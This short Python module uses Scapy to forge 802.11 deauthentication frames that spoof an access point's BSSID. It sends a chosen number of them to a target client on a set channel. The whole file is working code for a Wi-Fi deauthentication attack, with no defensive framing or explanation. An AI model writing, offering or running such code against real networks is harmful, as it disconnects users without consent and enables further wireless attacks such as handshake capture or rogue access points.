from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.all import sendp

from channel import set_channel


def deauth_packet(bssid, client):
    dot11 = Dot11(type=0, subtype=12, 
                addr1=client,   # dst
                addr2=bssid,    # src
                addr3=bssid)    # ap

    deauth = Dot11Deauth(reason=7)
    return RadioTap() / dot11 / deauth


def send_deauth(interface, bssid, client, channel, num_packets):
    set_channel(interface, channel)
    packet = deauth_packet(bssid, client)
    sendp(packet, iface=interface, count=num_packets)  # , inter=0.2
    